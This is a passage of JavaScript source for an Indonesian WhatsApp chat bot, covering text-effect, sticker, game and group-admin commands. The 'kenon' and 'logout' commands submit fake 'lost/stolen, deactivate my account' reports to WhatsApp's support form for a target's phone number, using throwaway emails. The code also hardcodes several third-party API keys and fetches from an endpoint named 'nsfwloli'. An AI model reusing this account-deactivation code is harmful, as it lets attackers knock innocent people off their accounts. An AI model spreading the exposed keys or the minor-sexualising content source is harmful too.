             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
             if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
             if (/karbon/.test(command)) link = 'https://textpro.me/carbon-text-effect-833.html'
             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
             if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
             if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
             if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
             if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
             let anu = await maker.textpro(link, q)
             dark.sendMessage(m.chat, { image: { url: anu }, caption: `Nih` }, { quoted: m })
             }
             break
             case 'glitch2': case 'harrypot': case 'graffiti': case 'pornhub': case 'glitch3': case '3dspace': case 'lion': case 'wolf': case 'retro': case '8bit': {
             if(!q) return reply(`${prefix + command} text1|text2`)
             reply(mess.wait)
             teks1 = q.split("|")[0]
             teks2 = q.split("|")[1]
             let link
             if (/glitch3/.test(command)) link = 'https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html'
             if (/harrypot/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/graffiti/.test(command)) link = 'https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html'
             if (/pornhub/.test(command)) link = 'https://textpro.me/pornhub-style-logo-online-generator-free-977.html'
             if (/glitch2/.test(command)) link = 'https://textpro.me/create-a-glitch-text-effect-online-free-1026.html'
             if (/3dspace/.test(command)) link = 'https://textpro.me/create-space-3d-text-effect-online-985.html'
             if (/lion/.test(command)) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'
             if (/wolf/.test(command)) link = 'https://textpro.me/create-wolf-logo-galaxy-online-936.html'
             if (/retro/.test(command)) link = 'https://textpro.me/create-3d-retro-text-effect-online-free-1065.html'
             if (/8bit/.test(command)) link = 'https://textpro.me/video-game-classic-8-bit-text-effect-1037.html'
             let anu = await maker.textpro(link, [`${teks1}`,`${teks2}`])
             dark.sendMessage(m.chat, { image: { url: anu }, caption: `Nih` }, { quoted: m })
             }
             break
case 'imagenobg': case 'removebg': case 'remove-bg': {
if (!quoted) throw reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) throw reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) throw reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let remobg = require('remove.bg')
let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
hmm = await './src/remobg-'+getRandom('')
localFile = await dark.downloadAndSaveMediaMessage(quoted, hmm)
outputFile = await './src/hremo-'+getRandom('.png')
reply(mess.wait)
remobg.removeBackgroundFromImageFile({
path: localFile,
apiKey: apinobg,
size: "regular",
type: "auto",
scale: "100%",
outputFile 
}).then(async result => {
dark.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: `Nih`}, { quoted : m })
await fs.unlinkSync(localFile)
await fs.unlinkSync(outputFile)
})
}
break
case 'dellist': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!q) return reply(`Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
}
break
case 'addlist': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n.${command} tes@apa`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil menambah List menu : *${args1}*`)
}
break
case 'shop': case 'list': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
var listMsg = {
text: `Hi @${sender.split("@")[0]}`,
buttonText: 'Click Here',
footer: `*List Database*`,
mentions: [sender],
sections: [{
title: 'List Database', rows: arr_rows
}]
}
dark.sendMessage(from, listMsg)
}
break
case 'report': {
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} Fitur anu error bang`)
var teks = `*| REPORT FITUR |*`
var teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
var teks2 = `\n\nSucces send to owner`
var dark = '6285870808160@s.whatsapp.net'
dark.sendMessage(dark, {text: teks + teks1, mentions:[sender]}, {quoted: m})
dark.sendMessage(from, {text: teks + teks2 + teks1, mentions:[sender]}, {quoted: m})
}
break
case 'speedtest': {
reply('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = await exec('python3 speed.py')
} catch (e) {
o = e
} finally {
let { stdout, stderr } = o
if (stdout.trim()) reply(stdout)
if (stderr.trim()) reply(stderr)
}
}
break
case 'kenon': {
if (!itsMedark) return reply(mess.owner)
if(!q) return reply("Masukan nomer telepon")
if(!q.startsWith("+")) return reply("masukan kode negara comtoh +62")
var imel = await (await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")).data[0]
 let data = {
  jazoest: '2954',
  lsd: 'AVotQVSNJiE',
  step: 'articles',
  country_selector: 'BR',
  phone_number: q,
  email: imel,
  email_confirm: imel,
  platform: 'ANDROID',
  your_message: 'Perdido/roubado: desative minha conta',
  __user: '0',
  __a: '1',
  __dyn: '7wKwkHgmwn8K2WnFwn84a2i5U4e1Fx-ewSwMxW0SU1nEhwem0nCq1ewcG0KE33w8G1nzU1vrzo5-0me220qu0L8ly82swdq0Ho2ewnE3fw6iw4vwbS1Lw4Cw',
  __csr: '',
  __req: '7',
  __hs: '19319.BP:whatsapp_www_pkg.2.22.23.85',
  dpr: '1',
  __ccg: 'UNKNOWN',
  __rev: '1006635516',
  __s: 'ng4ktn:fe3p07:ramsmu',
  __hsi: '7169210791910218313',
  __comet_req: '0'
}

let res = await axios({
  url: "https://www.whatsapp.com/contact/noclient/async/",
  method: "POST",
  headers: {
    cookie: "wa_lang_pref=tp_br; wa_ul=cf4df212-78b9-481b-8276-9dc801b280000; wa_csrf=d1BrQRQLuxsm0UE-L-O-wq",
  },
  data: new URLSearchParams(data)+""
}).then(res => res).catch(err => err.response)
return reply(util.format(JSON.stringify( res.status == 200 ? JSON.parse(res.data.replace("for (;;);", "")):res, null, 2)))
}
break
case 'getpp': {
if (!m.isGroup) return reply( mess.group)
if (!isAdmins) return reply( mess.admin)
if (!isBotAdmins) return reply( mess.botAdmin)
if (m.message.extendedTextMessage === null || m.message.extendedTextMessage === undefined) {
linkpp = await dark.profilePictureUrl(from) || "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"
dark.sendMessage(m.chat, { image : { url : linkpp }, caption:`Done` }, { quoted : m })
} else if (m.message.extendedTextMessage.contextInfo.mentionedJid === null || m.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
mberr = m.message.extendedTextMessage.contextInfo.participant
linkpp = await dark.profilePictureUrl(mberr) || "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"
dark.sendMessage(m.chat, { image : { url : linkpp }, caption:`Done` }, { quoted : m })
} else if (m.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
mberr = m.message.extendedTextMessage.contextInfo.mentionedJid[0]
linkpp = await dark.profilePictureUrl(mberr) || "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"
dark.sendMessage(m.chat, { image : { url : linkpp }, caption:`Done` }, { quoted : m })
}
}
break
case 'restart': {
if (!itsMedark) return reply(mess.owner)
txts = `Done`
reply(txts)
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = exec('pm2 restart all')
} catch (e) {
o = e
} finally {
let { stdout, stderr } = o
}
}
break
case 'donasi': {
let tekssss = `Anjass Ada Donasi 🗿`
dark.sendMessage(from, { image: fs.readFileSync(`./qris.jpg`),
caption: tekssss, 
footer: `This Is Simple WhatsApp Bot`},
{quoted: m})
}
break
case 'hentai': {
reply(mess.wait)
dark.sendMessage(m.chat, {image: {url: "https://saipulanuar.ga/api/nsfwloli"+text}}, {quoted: m})
}
break
case 'kitsune': {
reply(mess.wait)
axios.get(`https://api.waifu.pics/nsfw/waifu`)
.then(({
data
}) => {         dark.sendImage(m.chat, data.url, {caption: 'Nih'})
})
}
break    
case 'neko': {
reply(mess.wait)
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({
data
}) => {         dark.sendImage(m.chat, data.url, {caption: 'Nih'})
})
}
break    
case 'cecan': {
reply(mess.wait)
dark.sendMessage(m.chat, {image: {url: "https://web.zeeoneofc.my.id/api/cecan/china?apikey=Alphabot"+text}}, {quoted: m})
}
break    
case 'confess':
case 'confes': {
if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("Anda masih didalam room")
if (m.isGroup) return reply(mess.private)
if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${prefix}${command} nomer|pengirim|pesan\n\nContoh ${prefix}${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ${prefix}${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
let nomor = q.split('|')[0] ? q.split('|')[0] : q
let saking = q.split('|')[1] ? q.split('|')[1] : q
let pesan = q.split('|')[2] ? q.split('|')[2] : ''
if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : confess 62831xxxxxxxx|orang|hallo kamu`)
let teksnya = `Hai Kak Ada Confess Nih\n\nDari :  *${saking}*  \nPesan : *${pesan}* `
header = 'hayyy'
gambar = `https://telegra.ph/file/9c40b4a560d337e1a8560.jpg`

var button = [{ buttonId: `${prefix}confess2`, buttonText: { displayText: `Balas` }, type: 1 }, { buttonId: `${prefix}confess ${q}`, buttonText: { displayText: `Biarin` }, type: 1 }, {buttonId: `${prefix}leave` }, {
type: 1 }]
dark.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://telegra.ph/file/9c40b4a560d337e1a8560.jpg`}, buttons: button, footer: `This Is Simple WhatsApp Bot` })
m.reply(`Sukses Mengirim Confess!!`)
}
break
case 'menfess':
case 'menfes': {
if (m.isGroup) return reply(mess.private)
if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${prefix}${command} nomer|pengirim|pesan\n\nContoh ${prefix}${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ${prefix}${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
let nomor = q.split('|')[0] ? q.split('|')[0] : q
let saking = q.split('|')[1] ? q.split('|')[1] : q
let pesan = q.split('|')[2] ? q.split('|')[2] : ''
if (pesan.length < 1) return reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
let teksnya = `Hai Kak Ada Menfess Nih\n\nDari :  *${saking}*  \nPesan : *${pesan}* `
header = 'hayyy'
gambar = `https://telegra.ph/file/095624b0398215853e83b.jpg`

var button = [{ buttonId: `${prefix}menfess`, buttonText: { displayText: `Balas` }, type: 1 }, { buttonId: `${prefix}leave`, buttonText: { displayText: `Biarin` }, type: 1 }]
dark.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://telegra.ph/file/095624b0398215853e83b.jpg`}, buttons: button, footer: `This Is Simple WhatsApp Bot` })
m.reply(`Sukses Mengirim Menfess!!`)
}
break
case 'logout': {
if (!itsMedark) return reply(mess.owner)
if (Input) {
let cekno = await dark.onWhatsApp(Input)
if (cekno.length == 0) return reply(`Peserta tersebut Sudah Tidak Terdaftar Di WhatsApp`)
if (Input == ownerNumber + "@s.whatsapp.net") return reply(`Tidak Bisa Verif My Creator!`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`Succes.. Nomor Telah Out!`)
} else if (payload.includes(`"payload":false`)) {
reply(`Sedang Limit Tunggu Beberapa Saat.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan Nomor Target!')
}
break
case 'rules': {
return reply(`*──「 RULES-BOT 」──*

1. Jangan spam bot. 
Sanksi: *WARN/SOFT BLOCK*

2. Jangan telepon bot.
Sanksi: *SOFT BLOCK*

3. Jangan mengejek bot.
Sanksi: *PERMANENT BLOCK*

Jika sudah paham rulesnya
Ketik *.menu* untuk memulai bot `)
}
break
case 'tovn': {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply( `Audionya Mana?`)
if (!quoted) return reply( `Audionya Mana`)
reply(mess.wait)
let media = await quoted.download()
let { toPTT } = require('./lib/vn')
let audio = await toPTT(media, 'mp4')
dark.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
case 'setppgc2': {
if (!m.isGroup) return reply( mess.group)
if (!isAdmins) return reply( mess.admin)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!quoted) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
  try {
  let media = await dark.downloadAndSaveMediaMessage(quoted)
  let { img } = await pepe(media)
  await dark.query({
	tag: 'iq',
	attrs: {
	to: m.chat,
	type:'set',
	xmlns: 'w:profile:picture'
	},
	content: [
	{
	tag: 'picture',
	attrs: { type: 'image' },
    content: img
	}
	]
	})
reply(`Sukses`)
} catch (e) {
console.log(e)
reply(`Terjadi kesalahan, coba lagi nanti.`)
}
}
break
case 'setppbot2': {
if (!itsMedark) return reply(mess.owner)
if (!quoted) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
  try {
  let media = await dark.downloadAndSaveMediaMessage(quoted)
  let { img } = await pepe(media)
  await dark.query({
	tag: 'iq',
	attrs: {
	to: botNumber,
	type:'set',
	xmlns: 'w:profile:picture'
	},
	content: [
	{
	tag: 'picture',
	attrs: { type: 'image' },
    content: img
	}
	]
	})
reply(`Sukses`)
} catch (e) {
console.log(e)
reply(`Terjadi kesalahan, coba lagi nanti.`)
}
}
break
case 'waifu': {
reply(mess.wait)
dark.sendMessage(m.chat, {image: {url: "https://api.akuari.my.id/randomimganime/waifu"+text}}, {quoted: m})
}
break
case 'git': case 'gitclone': {
if (!args[0]) return reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
reply(mess.wait)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
dark.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
}
break
case 'pinterest': {
if (!q) return reply(`Mo Nyari Apa?`)
let { pinterest } = require('./lib/pinterest')
reply(mess.wait)
anu = await pinterest(text)
result = anu[Math.floor(Math.random()
* anu.length)]
dark.sendMessage(m.chat, { image: { url: result }, caption: 'Nih' }, { quoted: m })
}
break
case 'tts': {
if (!q) return reply('Textnya Mana?')
reply(mess.wait)                    
let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_id?query=${text}`)
dark.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mpeg', fileName: `${text}.mp3`}, { quoted: m })
}
break    
case 'loli': {
reply(mess.wait)
dark.sendMessage(m.chat, {image: {url: "https://saipulanuar.ga/api/loli"+text}}, {quoted: m})
}
break
case 'ping':
case 'runtime': {
let timestampe = speed();
let latensie = speed() - timestampe
let run = runtime(process.uptime())
let sp = latensie.toFixed(4)
reply(`*Runtime:* ${run}\n*Speed:* ${sp} second`)
}
break
case 'swm': {
if (!args.join(" ")) return reply(`Example :\n${prefix}${command}
Ngentod`)
reply(mess.wait)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
dark.downloadAndSaveMediaMessage(quoted, "gifee")
dark.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await dark.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await dark.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
confirmlimit(sender, 1)
} else {
reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'jadian': {
if (!m.isGroup) return reply( mess.group)
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian 💖 Jangan lupa pajak jadiannya 🐤 Ini Cuman Game Tod Gausah Baper 🗿
@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [me, jodoh]
let buttons = [
{ buttonId: `${prefix}jadian`, buttonText: { displayText: 'Jodohku' }, type: 1 }
]
await dark.sendButtonText(m.chat, buttons, jawab, dark.footer, m, {mentions: menst,})
}
break
case 'public': {
if (!itsMedark) return reply(mess.owner)
dark.public = true
reply('Sukse Change To Public Usage')
}
break
case 'self': {
if (!itsMedark) return reply(mess.owner)
dark.public = false
reply('Sukses Change To Self Usage')
}
break
case 'yts': case 'ytsearch': {
if (!q) return reply(`Mo Cari Apa?`)
reply(mess.wait)
let yts = require("yt-search")
let search = await yts(text)
/*let anu = search.videos[Math.floor(Math.random() * search.videos.length)]*/
let buttons = [
{buttonId: `${prefix}ytmp3 ${search.videos[0].url}`, buttonText: {displayText: 'Audio'}, type: 1},
{buttonId: `${prefix}ytmp4 ${search.videos[0].url}`, buttonText: {displayText: 'Video'}, type: 1}
]
let buttonMessage = {
image: { url: search.videos[0].thumbnail },
caption: `
⭔ Title : ${search.videos[0].title}
⭔ Ext : Search
⭔ ID : ${search.videos[0].videoId}
⭔ Duration : ${search.videos[0].timestamp}
⭔ Viewers : ${search.videos[0].views}
⭔ Upload At : ${search.videos[0].ago}
⭔ Author : ${search.videos[0].author.name}
⭔ Channel : ${search.videos[0].author.url}
⭔ Description : ${search.videos[0].description}
⭔ Url : ${search.videos[0].url}`,
footer: 'This Is Simple WhatsApp Bot',
buttons: buttons,
headerType: 4
}
dark.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'emojimix': {
if (!q) return reply(`Contoh ${prefix+command} 🗿+🥶`)
reply(mess.wait)
let [emoji1, emoji2] = text.split`+`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await dark.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'liston':{
if (!m.isGroup) return reply( mess.group)
if (!isAdmins) return reply( mess.admin)
if (!isBotAdmins) return reply( mess.botAdmin)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]),botNumber]
dark.sendText(m.chat, 'List Online:\n\n' + online.map(v => '友 @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break
case 'ttc': case 'ttt': case 'tictactoe': {
if (!m.isGroup) return reply(mess.group)
let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw ('Kamu masih didalam game')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
reply('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await dark.sendText(room.x, str, m, { mentions: parseMention(str) } )
await dark.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
case 'delttc': case 'delttt': {
if (!itsMedark) return reply(mess.owner)
this.game = this.game ? this.game : {}
try {
if (this.game) {
delete this.game
dark.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
} else if (!this.game) {
reply(`Session TicTacToe🎮 tidak ada`)
} else throw '?'
} catch (e) {
reply('rusak')
}
}
break
case 'ppcp': {
reply(mess.wait)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json') 
let random = anu[Math.floor(Math.random() * anu.length)]
dark.sendMessage(m.chat, { image: {url: random.male }, caption: `Cowok` }, { quoted: m })
dark.sendMessage(m.chat, { image: { url: random.female }, caption: `Cewek` }, { quoted: m })
}
break
case 'del': {
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) return reply( 'Pesan tersebut bukan dikirim oleh bot!')
dark.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'gc': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (args[0] === 'close'){
await dark.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await dark.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: `${prefix}gc open`, buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: `${prefix}gc close`, buttonText: { displayText: 'Close' }, type: 1 }
]
await dark.sendButtonText(m.chat, buttons, `Mode Group`)
}
}
break
case'linkgc': {
if (!m.isGroup) return reply(mess.group)
let response = await dark.groupInviteCode(m.chat)
dark.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'setppgc': {
if (!m.isGroup) return reply( mess.group)
if (!isAdmins) return reply( mess.admin)
if (!isBotAdmins) return reply( mess.botAdmin)
